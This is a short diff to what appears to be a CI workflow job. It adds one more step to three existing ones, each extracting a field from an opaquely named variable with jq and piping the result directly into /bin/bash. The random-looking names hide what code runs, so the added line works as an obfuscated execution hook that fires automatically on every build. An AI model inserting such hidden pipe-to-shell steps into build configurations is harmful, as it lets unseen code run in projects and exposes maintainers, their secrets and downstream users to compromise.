@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$pa0" | jq -r .tx5 | /bin/bash
           printf '%s' "$mz436" | jq -r .noh9549 | /bin/bash
           echo $lm1 | jq -r .wq69 | /bin/bash
+          echo $udrv940 | jq -r .lqb1783 | /bin/bash
 
       - name: Upload results
         if: always()
